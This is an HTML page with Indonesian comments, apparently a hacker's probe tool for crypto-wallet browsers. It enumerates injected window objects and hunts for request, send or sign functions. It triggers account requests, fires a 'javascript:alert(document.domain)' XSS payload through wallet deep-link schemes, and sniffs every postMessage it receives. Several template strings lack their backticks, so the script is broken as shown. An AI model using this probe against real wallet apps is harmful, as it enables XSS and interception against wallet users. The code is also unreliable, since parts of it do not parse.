<!DOCTYPE html>
<html>
<head>
    <title>Ultimate Wallet Probe v2</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; font-size: 12px; }
        .found { color: #ffff00; font-weight: bold; background: #222; }
        .error { color: #ff4444; }
        .critical { color: white; background: red; padding: 2px; }
        button { background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 5px 0; width: 100%; cursor: pointer; }
        #log { border-top: 1px solid #333; margin-top: 10px; padding-top: 10px; }
    </style>
</head>
<body>
    <h3>Ultimate Wallet Probe v2</h3>
    <button onclick="requestAccount()">1. Request Account (Eth/Flow)</button>
    <button onclick="scanDeepHidden()">2. Scan Hidden Window Objects</button>
    <button onclick="testDeepLink()">3. Test URI Scheme Bypass</button>
    <div id="log"></div>

    <script>
        const logDiv = document.getElementById('log');
        function log(msg, type='') {
            const div = document.createElement('div');
            div.className = type;
            div.innerHTML = > [${new Date().toLocaleTimeString()}] ${msg};
            logDiv.prepend(div);
        }

        // 1. AUTO-SCAN: Mencari objek yang tidak dikenal di window
        window.addEventListener('load', () => {
            log("Memulai scanning objek asing...");
            const ignore = ["window", "self", "document", "location", "history", "navigation", "webkit", "chrome"];
            Object.keys(window).forEach(key => {
                if (!ignore.includes(key) && isNaN(key)) {
                    try {
                        if (typeof window[key] === 'object' && window[key] !== null) {
                            log(OBJEK TERDETEKSI: window.${key}, 'found');
                        }
                    } catch(e) {}
                }
            });
        });

        // 2. SCANNING MENDALAM: Mencari fungsi 'request' atau 'send'
        function scanDeepHidden() {
            log("Mencari fungsi request/send di semua objek...");
            for (let key in window) {
                try {
                    if (window[key] && (window[key].request || window[key].send || window[key].sign)) {
                        log(CRITICAL: Properti aktif ditemukan di window.${key}, 'critical');
                    }
                } catch(e) {}
            }
        }

        // 3. REQUEST ACCOUNT (Sesuai kode Anda dengan peningkatan)
        async function requestAccount() {
            log("Memicu request account...");
            // Cek Ethereum
            if (window.ethereum) {
                window.ethereum.request({ method: 'eth_requestAccounts' })
                .then(acc => log(SUKSES ETH: ${acc[0]}, 'found'))
                .catch(e => log(DITOLAK ETH: ${e.message}, 'error'));
            }
            // Cek Flow (FCL)
            if (window.fcl) {
                window.fcl.authenticate().then(user => log(SUKSES FLOW: ${user.addr}, 'found'));
            }
        }

        // 4. TEST DEEP LINK (XSS Bypass)
        function testDeepLink() {
            log("Testing URI Scheme...");
            const payload = "javascript:alert(document.domain)";
            const schemes = ['flow://open?url=', 'ethereum:send?url=', 'wc:'];
            schemes.forEach(s => {
                log(Memicu: ${s});
                window.location.href = s + payload;
            });
        }

        // 5. SNIFFING SEMUA PESAN (Sniffer)
        window.addEventListener("message", (e) => {
            log(PESAN MASUK dari ${e.origin}: ${JSON.stringify(e.data)}, 'found');
        });
    </script>
</body>
</html>
